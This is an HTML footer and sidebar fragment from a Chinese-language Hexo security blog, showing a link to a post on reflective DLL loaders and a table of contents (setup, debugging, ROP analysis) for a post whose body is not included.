+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/08/15/%E5%8F%8D%E5%B0%84%20DLL%20%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/">反射 DLL 加载器原理与实现 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Calico</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">ROP 分析</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
